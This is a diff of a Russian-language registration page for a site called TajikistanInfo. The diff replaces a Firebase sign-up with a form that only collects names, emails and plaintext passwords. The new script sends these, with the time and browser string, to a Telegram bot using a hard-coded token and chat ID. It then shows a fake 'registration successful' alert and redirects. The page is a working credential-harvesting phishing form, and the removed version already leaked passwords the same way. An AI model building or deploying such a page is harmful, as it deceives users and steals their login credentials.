@@ -1,95 +1,114 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Tajikistan Info</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Регистрация | TajikistanInfo</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: url('https://wallpapercave.com/wp/wp7153361.jpg') no-repeat center center fixed;
+      background: url('https://i.imgur.com/eGZnbA3.jpg') no-repeat center center fixed;
       background-size: cover;
-      color: white;
-      text-align: center;
-      padding-top: 100px;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
     }
+
     .form-container {
-      background: rgba(0,0,0,0.6);
+      background: rgba(255, 255, 255, 0.9);
       padding: 30px;
       border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3);
       max-width: 400px;
-      margin: auto;
-    }
-    input, button {
-      display: block;
       width: 100%;
-      margin: 10px 0;
-      padding: 10px;
-      border-radius: 10px;
-      border: none;
-      font-size: 16px;
     }
+
+    h2 {
+      text-align: center;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      transition: border 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #4CAF50;
+      outline: none;
+    }
+
     button {
+      width: 100%;
+      padding: 12px;
       background-color: #4CAF50;
       color: white;
+      border: none;
+      border-radius: 10px;
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
+
     button:hover {
       background-color: #45a049;
+    }
+
+    .note {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #777;
+      text-align: center;
     }
   </style>
 </head>
 <body>
+
   <div class="form-container">
-    <h1>Регистрация</h1>
-    <input type="text" id="name" placeholder="Ваше имя" required />
-    <input type="email" id="email" placeholder="Email" required />
-    <input type="password" id="password" placeholder="Пароль" required />
-    <button onclick="register()">Зарегистрироваться</button>
+    <h2>Регистрация</h2>
+    <form id="registerForm">
+      <input type="text" id="name" placeholder="Имя" required />
+      <input type="email" id="email" placeholder="Email" required />
+      <input type="password" id="password" placeholder="Пароль" required />
+      <button type="submit">Зарегистрироваться</button>
+    </form>
+    <div class="note">После регистрации вы будете перенаправлены на сайт.</div>
   </div>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
-    import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
+  <script>
+    document.getElementById("registerForm").addEventListener("submit", function(event) {
+      event.preventDefault();
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyCdD7KS--Dq9-ShTTtszbiZpAP1SLmyNi8",
-      authDomain: "tajikistaninfo.firebaseapp.com",
-      projectId: "tajikistaninfo",
-      storageBucket: "tajikistaninfo.appspot.com",
-      messagingSenderId: "338365556980",
-      appId: "1:338365556980:web:4706a1975bb0a456d456a1"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const auth = getAuth(app);
-
-    async function register() {
       const name = document.getElementById("name").value;
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
-      const userAgent = navigator.userAgent;
-      const date = new Date().toLocaleString();
+      const browser = navigator.userAgent;
+      const time = new Date().toLocaleString();
 
-      try {
-        const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-        alert("Регистрация прошла успешно!");
+      // Отправка данных в Telegram
+      const token = "8475376842:AAEy04lqJHk-dWz11UxfDqOooIniobMgqTQ";
+      const chat_id = "8012802187";
+      const message = `👤 Новая регистрация\n\n🧑 Имя: ${name}\n📧 Email: ${email}\n🔐 Пароль: ${password}\n🕒 Время: ${time}\n🌐 Браузер: ${browser}`;
 
-        // Отправка в Telegram
-        const message = `📝 Новая регистрация:
-👤 Имя: ${name}
-📧 Email: ${email}
-🔑 Пароль: ${password}
-🕒 Время: ${date}
-🌐 Браузер: ${userAgent}`;
-        const telegramUrl = `https://api.telegram.org/bot8475376842:AAEy04lqJHk-dWz11UxfDqOooIniobMgqTQ/sendMessage?chat_id=8012802187&text=${encodeURIComponent(message)}`;
-        fetch(telegramUrl);
-      } catch (error) {
-        alert("Ошибка: " + error.message);
-      }
-    }
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      });
+
+      alert("Регистрация прошла успешно!");
+      window.location.href = "https://tajikistaninfo.free.nf"; // Замени при необходимости
+    });
   </script>
 </body>
 </html>
